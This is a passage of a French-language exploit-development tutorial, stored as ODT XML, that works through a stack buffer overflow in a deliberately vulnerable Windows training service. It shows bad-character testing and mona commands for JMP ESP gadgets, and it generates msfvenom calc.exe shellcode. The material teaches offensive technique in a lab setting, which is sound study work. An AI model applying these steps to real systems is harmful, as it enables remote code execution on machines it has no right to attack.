      <text:p text:style-name="P9"/>
      <text:p text:style-name="P4">buf += "D"*(total_size – len(buf))</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">En d'autres termes, on remplit le buffer jusqu'à ce qu'il fasse 1024 caractères (la taille initiale avec laquelle on a écrasé le Saved Return Pointer). On veut donc que le buffer fasse 1024 caractères, comme dans nos tests précédents ; pourquoi ?</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On appelle ça du <text:span text:style-name="T19">trailing padding</text:span><text:span text:style-name="T18"> :</text:span></text:p>
      <text:p text:style-name="P9">"<text:span text:style-name="T14">It’s sometimes necessary to keep the total length of what you’re sending constant. Some programs will behave differently with differently sized inputs, and until you’re certain that this won’t affect </text:span><text:soft-page-break/><text:span text:style-name="T14">your exploit, you should keep the length constant. In our case, let’s always send buf_totlen (1024) characters followed by a newline</text:span>".</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Bref, faisons rouler notre script :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images34" text:anchor-type="paragraph" svg:width="14.369cm" svg:height="4.5cm" draw:z-index="33"><draw:image xlink:href="Pictures/2000000700003820000011934ACF6AE5.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Le résultat est bien attendu : EIP contient uniquement des "42" (hexadécimal pour "B"), et ESP pointe bien sur une adresse contenant nos 4 "C" (suivis bien sûr par nos "D"). On a ce qu'on appel "<text:span text:style-name="T14">EIP control</text:span><text:span text:style-name="T18">".</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P10">DETERMINE "BAD CHARACTERS"</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P9">Maintenant qu'on a le contrôle d'EIP, on voudrait injecter certaines valeurs dedans. Mais jusqu'ici, on a uniquement écrasé EIP avec des "A", ou des "B". Il faut qu'on détermine quels caractères on peut envoyer au programme pour qu'il les stock dans la variable vulnérable.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">En effet, certains caractères ne pourront sûrement pas être utilisés, et feront que notre exploit ne se comportera pas comme prévu, ou tout simplement ne fonctionnera pas. On appelle ces caractères les "bad characters" ou "badchars".</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Sans vraiment faire de tests approfondis, on peut déterminer 2 badchars.</text:p>
      <text:p text:style-name="P9"/>
      <text:list xml:id="list3986362371417527188" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P25">En effet, toutes les chaînes de caractères en C se terminent par un NULL BYTE, "\0", soit "\x00" en hexadécimal. Si on envoyait ce caractère à notre programme et qu'il était stocké dans le buffer <text:span text:style-name="T5">response[128]</text:span>, rien de ce qui suit ce caractère ne serait pris en compte, ce qui n'est pas un comportement souhaité.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P25">Ensuite, on sait que la fonction <text:span text:style-name="T5">handleConnection()</text:span> parse les inputs qu'elle reçoit en fonction des "\n" qu'elle repère. Dès qu'elle croise un "\n" elle appelle <text:span text:style-name="T5">doResponse()</text:span>. Donc si on utilisait le caractère "\x0A" ("\n" en hexadécimal), <text:span text:style-name="T5">handleConnection()</text:span> diviserait les données qu'on enverrait par 2, et construirait 2 réponses distinctes, ce qui n'est pas non plus le comportement souhaité.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Pour s'assurer qu'on a pas manqué d'autres badchars, on va procéder de la manière suivante :</text:p>
      <text:p text:style-name="P9"/>
      <text:list xml:id="list7208191753418717669" text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P26">On écrit l'intégralité des caractères que l'on veut tester dans une binary file (donc tous les caractères ASCII, sauf les badchars connus, ici "\x00" et "\x0A"). Pourquoi binary file ? Parce qu'on va comparer avec le contenu d'un programme compilé, en langage machine (binaire) donc.</text:p>
          <text:p text:style-name="P26"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P36"><text:span text:style-name="T15">On écrit également l'intégralité de ces caractères dans notre payload, de sortes qu'ESP pointe sur le début de cette chaîne de caractère après que le programme ait crash (on fait donc </text:span><text:soft-page-break/><text:span text:style-name="T15">commencer cette chaîne juste après les "B" qui vont écraser le Saved Return Pointer, puisqu'ESP pointe 4 bytes plus bas suite au RETN).</text:span></text:p>
          <text:p text:style-name="P26"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P36"><text:span text:style-name="T15">On compare ensuite la chaîne de caractère pointée par ESP à notre fichier binaire en utilisant mona. Si mona trouve l'intégralité du contenu du fichier binaire dans la chaîne pointée par ESP, elle affirmera que la comparaison a réussi, et c'est qu'on aura bien isolé tous les badchars / qu'il n'y aura que des "goodchars" dans la chaîne test (en effet, s'il y avait des badchars comme "\x00", on aurait pas retrouvé tous les caractères suivant celui-ci, car le buffer </text:span><text:span text:style-name="T4">response[128]</text:span><text:span text:style-name="T15"> s'y serait arrêté. De même pour "\x0A", on aurait pas eu dans ESP tous les caractères suivants).</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Bref, on modifie notre script pour qu'il donne ça :</text:p>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images35" text:anchor-type="paragraph" svg:width="10.373cm" svg:height="17.224cm" draw:z-index="34"><draw:image xlink:href="Pictures/2000000700002885000043496B1C9A0D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Remarque : on va jusqu'à 0xFF+1 car la range ne comprend pas le dernier élément.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Bref, maintenant qu'on a ce script modifié, faisons tourner notre programme dans Immunity, et exécutons le script (sans breakpoint, autant aller directement au bug).</text:p>
      <text:p text:style-name="P9"><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">Premièrement, examinons notre fichier <text:span text:style-name="T5">badchar_test.bin</text:span> qui a été généré grâce à <text:span text:style-name="T5">xxd</text:span> (command-line hex viewer) :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images36" text:anchor-type="paragraph" svg:width="13.019cm" svg:height="6.802cm" draw:z-index="35"><draw:image xlink:href="Pictures/20000007000032DB00001A91E79D4328.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On retrouve bien tous nos caractères en hexa (sauf 00 et 0A, comme demandé).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Maintenant dans Immunity, on voit que le programme a crash (comme prévu, EIP pointe sur <text:span text:style-name="T5">42424242</text:span>), et qu'ESP pointe sur l'adresse mémoire <text:span text:style-name="T5">0x00B319E4</text:span>. A cette adresse sur la stack, on semble retrouver un contenu similaire à notre fichier binaire :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images37" text:anchor-type="paragraph" svg:width="8.019cm" svg:height="9.791cm" draw:z-index="36"><draw:image xlink:href="Pictures/2000000700001F520000263F8642EB25.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">(Bien que cela soit affiché en <text:span text:style-name="T14">little endian</text:span><text:span text:style-name="T18">). Pour plus de clareté, on clic droit sur le registre ESP, puis on sélectionne "Follow in dump". On voit désormais, dans le cadre en bas à droite (dump mémoire), un contenu qui ressemble définitivement à notre fichier binaire de comparaison :</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr2" draw:name="images38" text:anchor-type="paragraph" svg:width="14.527cm" svg:height="9.051cm" draw:z-index="37"><draw:image xlink:href="Pictures/20000007000038BF0000235A06E40D41.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P11">Mais pour être vraiment sûr et comme mentionné ci-dessus, on va utiliser mona pour comparer ce que pointe le registre ESP, et notre fichier binaire de comparaison. Premièrement, on transfert ce dernier sur notre hôte windows. Puis, on utilise cette commande de mona :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P5">!mona compare -a esp -f C:\Users\quent\Downloads\badchar_test.bin</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P9"><text:span text:style-name="T18">Et mona nous confirme bien que la comparaison est réussie entre le fichier et l'emplacement mémoire </text:span><text:span text:style-name="T7">0x00B319E4</text:span><text:span text:style-name="T18"> (emplacement d'ESP). </text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr4" draw:name="images39" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.602cm" draw:z-index="38"><draw:image xlink:href="Pictures/20000007000070A9000017E1F44464D2.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11">On a donc bien tous les badchars dans notre liste (00 et 0A).</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13">RETN TO "JMP ESP"</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Maintenant qu'on a le contrôle d'EIP, et qu'on connaît les caractères qu'on doit éviter dans le payload, on veut rediriger le flux d'exécution du programme (en écrasant le Saved Return Pointer) vers un endroit de la mémoire dont on contrôle le contenu : typiquement, la stack (qui contient les variables locales qu'on envoie au programme).</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">On peut mettre notre shellcode n'importe où dans le payload (avant ou après la partie qui écrase l'adresse de retour), il se retrouvera sur la stack, et ensuite hardcoder l'adresse de notre shellcode sur la partie du message qui écrasera le Saved Return Pointer. C'est l'approche qui a été adoptée dans le livre, et le cours RE.</text:p>
      <text:p text:style-name="P11"><text:soft-page-break/></text:p>
      <text:p text:style-name="P11">Mais ici, l'auteur fait une remarque intéressante, et juste. C'est une mauvaise idée d'entrer dans notre payload une adresse en absolu (hard-codé), pour deux raisons :</text:p>
      <text:p text:style-name="P11"/>
      <text:list xml:id="list7150676876342972738" text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P27">Premièrement, même si le programme n'a pas été compilé avec ASLR (address space layout randomization, rend les adresses utilisées par le programme aléatoires), le système d'exploitation peut avoir un mécanisme rendant aléatoire les emplacements utilisés dans la stack. A chaque fois qu'on exécutera le programme, les adresses utilisées dans la pile pourraient être différentes (c'est exactement le cas pour moi).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P27">Deuxièmement, le programme utilise des threads. A chaque fois qu'une connection est faîte au service, une nouvelle thread est créée pour gérer cette connection. Il n'y a aucune garantie que deux connections auront leurs stacks aux mêmes adresses, et c'est même impossible si les connections sont simultanées.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Bref, les adresses de la stack peuvent changer selon différentes invocations du service, ou lors d'une même invocation du service. Puisque déterminer précisément les adresses de la pile est généralement compliqué pour ces raisons, il est toujours mieux de pivoter vers notre shellcode en utilisant quelque chose se situant dans un espace statique de la mémoire.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Typiquement, le <text:span text:style-name="T9">code</text:span> de dostackbufferoverflow.exe sera toujours situé aux mêmes espaces dans la mémoire (car compilé sans ASLR). On va donc faire la chose suivante :</text:p>
      <text:p text:style-name="P11"/>
      <text:list xml:id="list8953851941545120708" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P28">Premièrement, on repère une instruction de notre exécutable qui correspond à l'instruction "JMP ESP". Cette instruction redirige le flux d'exécution (EIP) vers l'adresse pointée par ESP. L'adresse d'une telle instruction "JMP ESP" sera toujours la même.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P11"/>
      <text:list xml:id="list7719767300138053403" text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P29">On écrase le Saved Return Pointer avec l'adresse de l'instruction "JMP ESP".</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P11"/>
      <text:list xml:id="list7323257895299175756" text:style-name="L15">
        <text:list-item>
          <text:p text:style-name="P30">Lorsque le call à RETN sera fait, il se passera deux choses : EIP pointera sur l'instruction "JMP ESP", et ESP sera incrémenté de 4, pointant sur l'espace de la stack situé juste après notre Saved Return Pointer écrasé.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P11"/>
      <text:list xml:id="list8925644667466057383" text:style-name="L16">
        <text:list-item>
          <text:p text:style-name="P31">EIP exécutera l'instruction "JMP ESP", ce qui va rediriger le flux d'exécution vers l'adresse pointée par ESP, dans la stack, juste après le Saved Return Pointer écrasé.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P11"/>
      <text:list xml:id="list443221363824964613" text:style-name="L17">
        <text:list-item>
          <text:p text:style-name="P32">C'est précisément là où on aura placé notre shellcode, qui sera exécuté.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">L'instruction "JMP ESP" est une sorte de trampoline qui va nous permettre de faire pivoter le flux d'exécution vers les adresses mémoires de la pile, dont on contrôle le contenu. Ces instructions / séquences d'instructions pratiques contenues dans un programme ou un langage de programmation existant sont appelées des "Gadgets"<text:tab/>.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Bref, cherchons des adresses mémoires dans le code de notre programme <text:s/>dostackbufferoverflow.exe qui contiennent l'instruction "JMP ESP". Pour cela, mona est très utile (entrer cette commande lorsque le programme est en train de tourner, ou a crash, peu importe) :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P5">!mona jmp -r esp -cpd "\x00\x0A"</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Pour voir l'output (qui est presque instantanément caché par les autres fenêtres), faire "Show Log Window" (ou "Alt+L").</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr4" draw:name="images40" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.665cm" draw:z-index="39"><draw:image xlink:href="Pictures/200000070000473700000B2BB5D1A45E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P11">Bref, on trouve deux adresses mémoires statiques contenant l'instruction qui nous intéresse :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr4" draw:name="images41" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.993cm" draw:z-index="40"><draw:image xlink:href="Pictures/20000007000068E800000C4EDBAD756A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11">On a donc <text:span text:style-name="T5">0x080414c3</text:span> ou <text:span text:style-name="T5">0x080416bf</text:span> qui remplissent nos exigences (bonne instruction et ne contiennent pas de badchars). En faisant "Clic Droit" puis "Follow in disassembler" sur l'un de ces pointeurs, on peut bien vérifier qu'ils désignent un emplacement mémoire avec l'instruction JMP ESP.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Ainsi, si on écrase la valeur du Saved Return Pointer avec l'une de ces deux adresses, lorsque <text:span text:style-name="T5">doResponse()</text:span> invoque son instruction RETN, l'instruction "JMP ESP" sera exécutée, et le flux d'exécution sera détourné vers les données qu'on aura envoyé après la valeur écrasant le Saved Return Pointer :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr4" draw:name="images42" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="5.98cm" draw:z-index="41"><draw:image xlink:href="Pictures/20000007000046CD000018E958AB13D3.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Mais attention, encore une chose avant d'exécuter notre plan. Pour écraser le Saved Return Pointer, il faut prendre en compte le fait que les processeurs x86 ont une architecture <text:span text:style-name="T14">little endian</text:span>. Dans une architecture <text:span text:style-name="T14">little endian</text:span>, les valeurs telles que les <text:span text:style-name="T9">nombres</text:span> et les <text:span text:style-name="T9">adresses mémoires</text:span> sont stockées en mémoire <text:span text:style-name="T9">dans l'ordre inverse </text:span>(back-to-front), avec le Least Significant Byte (LSB) en premier. Les chaînes de caractères, les instructions de code etc... sont des valeurs qui, elles, sont stockées à l'endroit (front-to-back) :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">For example:</text:p>
      <text:p text:style-name="P11">&gt; ASCII strings (e.g. "ABCD") are stored front-to-back: "\x41\x42\x43\x44\x00".</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">&gt; Code (e.g. "NOP # NOP # NOP # RET") is stored front-to-back: "\x90\x90\x90\xC3".</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">&gt; Numbers (e.g. 0x1337) are stored back-to-front: "\x37\x13\x00\x00".</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><text:soft-page-break/>&gt; Memory addresses or “pointers” (e.g. 0xDEADBEEF) are stored back-tofront: "\xEF\xBE\xAD\xDE".</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Donc quand on va mettre dans notre payload l'adresse d'un emplacement mémoire contenant l'instruction "JMP ESP", il faudra faire attention à bien inverser les bytes de cette adresse pour que le CPU (s'attendant à une adresse exprimée en <text:span text:style-name="T14">little endian</text:span>) l'interprète correctement. Typiquement, il ne faudra pas écrire <text:span text:style-name="T5">\x08\x04\x14\xc3</text:span>, mais <text:span text:style-name="T8">\xc3\x14\x04\x08</text:span>.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">On peut le faire manuellement comme je viens de le faire ici, mais ça peut engendrer des erreurs, et c'est moins lisible dans le code de notre exploit. En python, il y a un module qui fait ça très bien, le module <text:span text:style-name="T5">struct</text:span>.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr3" draw:name="images43" text:anchor-type="paragraph" svg:width="13.152cm" svg:height="2.489cm" draw:z-index="42"><draw:image xlink:href="Pictures/200000070000335F000009B8DCA365FE.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11">Pour des questions de clarté, utilisons cette fonction dans le code de notre exploit. Il est temps maintenant de mettre à jour notre exploit pour faire en sortes que le Saved Return Pointer soit écrasé par l'adresse <text:span text:style-name="T5">0x080414c3</text:span>, ce qui redirigera le flux d'exécution vers ce qui suit cette adresse dans la stack.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Pour le bytecode qu'on veut faire exécuter à la machine, on va pour le moment simplement rediriger vers plusieurs instructions "\xCC". Cette instruction se traduit en assembleur par "INT 3", et il s'agit d'une instruction qui provoque une interruption du programme, comme un breakpoint.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P14">En réalité c'est ce mécanisme qu'utilisent les débugger pour générer des breakpoints. En fait, le débugger remplace un byte du code du programme par un "INT 3" à l'endroit où l'utilisateur souhaite que le programme s'arrête, puis quand le breakpoint est atteint, le débugger remplace le byte "INT 3" par sa valeur d'origine dans le programme !</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Essayons d'implémenter 4 instructions "INT 3", voir si Immunity essaie bien d'exécuter ces 4 instructions (en s'arrêtant donc 4 fois). Examinons le comportement de notre programme avec ce script de manière détaillée, en mettant un breakpoint à l'adresse <text:span text:style-name="T5">0x8041794</text:span>, soit l'épilogue de la fonction <text:span text:style-name="T5">doResponse()</text:span>.</text:p>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr1" draw:name="images44" text:anchor-type="paragraph" svg:x="0.827cm" svg:y="0.249cm" svg:width="14.279cm" svg:height="7.188cm" draw:z-index="43"><draw:image xlink:href="Pictures/2000000700003BBE00001E14E06857F2.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11"><text:soft-page-break/></text:p>
      <text:p text:style-name="P11">On voit bien que notre adresse de retour a été écrasée avec la bonne adresse (<text:span text:style-name="T5">0x08414c3</text:span>), qui pointe bien sur un "JMP ESP", et que cette adresse de retour est suivie de nos "INT 3" (sous la forme de 4 "CC"). Lorsqu'on clic sur "Run" de nouveau, on voit la chose suivante :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr3" draw:name="images45" text:anchor-type="paragraph" svg:width="12.755cm" svg:height="1.88cm" draw:z-index="44"><draw:image xlink:href="Pictures/20000007000031D2000007585C3A2111.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr3" draw:name="images46" text:anchor-type="paragraph" svg:width="10.717cm" svg:height="4.5cm" draw:z-index="45"><draw:image xlink:href="Pictures/20000007000029DD00001193EB68A350.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11">On voit bien que le flux d'exécution a été redirigé vers la stack, ou plus précisément vers l'adresse sur laquelle pointe ESP, comme prévu (en réalité une adresse plus haut, car le premier "INT 3" n'a pas été désassemblé en tant que tel par Immunity, qui l'a considéré comme faisant partie d'une instruction précédente...). Et dans la stack, on retrouve bien nos instructions "INT 3", qui sont exécutées.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">On a achevé ici Remote Code Execution (c'est juste que le code qu'on exécute pour le moment n'est pas terriblement utile, mais ça va venir).</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13">GENERATE SHELLCODE</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Il nous faut maintenant générer un bytecode intéressant à implémenter sur la stack. Un bytecode qui est utile pour l'exploitation d'une vulnérabilité dans un programme est souvent appelé "shellcode", car traditionnellement ces instructions permettent à l'attaquant d'obtenir une interactive shell sur le système attaqué. Mais le shellcode n'est pas limité à produire des shells, on peut simplement exécuter une commande, désactiver un firewall, ajouter un nouvel utilisateur etc...</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">Un shellcode permettant de faire apparaître une reverse shell est certainement le type de shellcode le plus sexy. Mais cela peut parfois s'avérer un peu complexe, ou en tout cas c'est un facteur d'erreur supplémentaire. C'est pourquoi, pour être certain que notre exploit fonctionne, on essaie souvent dans un premier temps de faire exécuter un shellcode plus simple. Typiquement sur Windows, un shellcode assez simple est celui qui permet d'exécuter le programme </text:span><text:span text:style-name="T3">calc.exe</text:span><text:span text:style-name="T1"> (popping calc).</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">Pour générer notre shellcode permettant d'exécuter </text:span><text:span text:style-name="T3">calc.exe</text:span><text:span text:style-name="T1">, on va utiliser msfvenom. Plus précisément, on va utiliser le payload </text:span><text:span text:style-name="T3">windows/exec</text:span><text:span text:style-name="T1">, qui nous permet simplement d'exécuter une commande sur le système cible. Pour voir les options de ce payload :</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P5">msfvenom -p windows/exec --list-options</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">On voit qu'on a principalement deux options :</text:p>
      <text:p text:style-name="P11"/>
      <text:list xml:id="list176547674816556197" text:style-name="L18">
        <text:list-item>
          <text:p text:style-name="P35"><text:soft-page-break/><text:span text:style-name="T1">CMD, ou la commande à exécuter. Ici </text:span><text:span text:style-name="T3">calc.exe</text:span><text:span text:style-name="T1">, qui est dans le PATH windows.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35"><text:span text:style-name="T1">EXITFUNC. Cette option est assez importante, et spécifie comment le shellcode doit "nettoyer" le programme dans lequel il s'exécute après être passé. Si aucun nettoyage n'était effectué, le programme continuerait d'essayer d'exécuter des instructions sur la pile après avoir fini d'exécuter le shellcode. Ce qui ferait crasher le process, et pourrait être assez mauvais pour nous dans notre exploitation. En laissant EXITFUNC à sa valeur par défaut, </text:span><text:span text:style-name="T3">process</text:span><text:span text:style-name="T1">, le shellcode arrête le programme complètement après s'être exécuté. Nous allons le mettre sur </text:span><text:span text:style-name="T3">threads</text:span><text:span text:style-name="T1"> pour que cela soit plus élégant dans notre cas particulier. En effet, </text:span><text:span text:style-name="T3">dostackbufferoverflow.exe</text:span><text:span text:style-name="T1"> traite les connections clients dans des threads séparées, donc notre shellcode va s'exécuter, arrêter sa thread, mais le programme continuera à tourner.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Notre commande finale ressemblera à ça :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P5">msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">On voit qu'on a précisé nos badchars pour les éviter, un output </text:span><text:span text:style-name="T13">python friendly</text:span><text:span text:style-name="T1">, et un nom de variable.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr2" draw:name="images47" text:anchor-type="paragraph" svg:width="16.036cm" svg:height="12.411cm" draw:z-index="46"><draw:image xlink:href="Pictures/2000000700003EA30000307A9C682CED.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T1">REMARQUE : on a un caractère "b" avant chaque chaîne de caractère. C'est dû au fait que Metasploit envisage le fait qu'on utilise Python3 : "</text:span><text:span text:style-name="T13">In Python 3, due to its preference for Unicode by default, socket.socket (along with many other functions) works with bytes instead of strings</text:span><text:span text:style-name="T1">". Le "b" devant nos chaînes de caractères nous permet de construire des </text:span><text:span text:style-name="T13">bytes objects</text:span><text:span text:style-name="T1">. Python2 ignore ce caractère "b", donc on peut le laisser, mais pour plus de propreté, autant l'enlever.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:soft-page-break/><text:span text:style-name="T1">On a désormais notre shellcode, stocké dans une variable. Mais on voit également que </text:span><text:span text:style-name="T3">msfvenom</text:span><text:span text:style-name="T1"> l'a encodé avec </text:span><text:span text:style-name="T3">x86/shikata_ga_nai</text:span><text:span text:style-name="T1">. C'est le cas car sans encodeur, le payload windows/exec contient presque automatiquement les badchars que nous avons précisé ("\x00\x0A"). Notre shellcode a donc été encodé, puis un </text:span><text:span text:style-name="T13">shikata_ga_nai decoder stub</text:span><text:span text:style-name="T1"> a été placé juste avant : le decoder stub va permettre de décoder notre shellcode pour l'exécuter. Sous cette forme, notre shellcode ne comprend plus de badchars.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">On a donc notre shellcode, mais il y a un dernier point à régler maintenant. On vient de voir que notre shellcode a été encodé, et qu'un decoder stub le précède pour le décoder. En réalité, seul le decoder stub est exécutable ; le shellcode dans son état encodé ne l'est pas, c'est le job du decoder stub de parcourir le shellcode encodé, et de le décoder pour qu'il soit en capacité de produire la commande demandée.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">Pour faire cela, le decoder stub a besoin de déterminer là où il se trouve dans la mémoire, et à partir de là, il regarde quelques bytes après, pour trouver le shellcode encodé qu'il doit décoder. Pour connaître son emplacement mémoire, le decoder stub exécute une série d'instructions qu'on connaît sous le nom de routine </text:span><text:span text:style-name="T3">GetPC</text:span><text:span text:style-name="T1"> (vient du fait que le registre EIP est également appelé Program Counter, ou PC).</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">Le problème avec la routine </text:span><text:span text:style-name="T3">GetPC</text:span><text:span text:style-name="T1">, c'est qu'elle est un peu destructrice. Pour connaître son emplacement mémoire, les instructions machines exécutées ont tendance à détruire quelques bytes d'un côté et de l'autre du registre ESP. Ce qui peut s'avérer problématique pour nous, car notre shellcode est précisément situé à l'adresse exacte pointée par ESP. La routine </text:span><text:span text:style-name="T3">GetPC</text:span><text:span text:style-name="T1"> pourrait ainsi effacer une partie du decoder stub lui-même, voire dépasser sur le shellcode encodé. Le code machine ainsi corrompu fera très certainement crash notre exploit.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">On a deux manières de gérer ce phénomène et d'éviter que la routine </text:span><text:span text:style-name="T3">GetPC</text:span><text:span text:style-name="T1"> n'endommage notre shellcode.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:list xml:id="list5015559945770683572" text:style-name="L19">
        <text:list-item>
          <text:p text:style-name="P33">The lazy way</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">Certaines personnes vont résoudre ce problème en plaçant une NOP Sled devant leur shellcode encodé. NOP veut dire "No Operation", il s'agit d'une instruction machine qui ne fait absolument rien. Sur les processeurs Intel x86, elle correspond à </text:span><text:span text:style-name="T3">\x90</text:span><text:span text:style-name="T1">.</text:span></text:p>
